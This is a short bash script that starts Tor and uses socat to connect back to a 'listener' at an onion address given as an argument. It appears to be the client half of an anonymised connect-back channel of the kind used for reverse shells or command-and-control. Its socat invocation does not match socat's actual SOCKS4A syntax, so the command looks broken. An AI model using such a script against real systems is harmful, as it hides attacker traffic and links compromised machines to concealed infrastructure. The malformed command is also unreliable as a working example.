#!/bin/bash

# Set the Onion address passed as an argument
LISTENER_ONION_ADDRESS=$1

# Check if the Onion address is provided
if [ -z "$LISTENER_ONION_ADDRESS" ]; then
  echo "[-] Error: Listener Onion address not provided."
  exit 1
fi

# Configure Tor to route the traffic
echo "[+] Configuring Tor to connect to the listener..."

# Wait for Tor to start
echo "[+] Starting Tor service..."
tor &

# Allow Tor some time to initialize
sleep 20

# Connect to the listener over the Tor network
echo "[+] Attempting connection to the listener..."
socat TCP4:127.0.0.1:9050,proxyconnect=SOCKS4A:$LISTENER_ONION_ADDRESS:80 STDIO
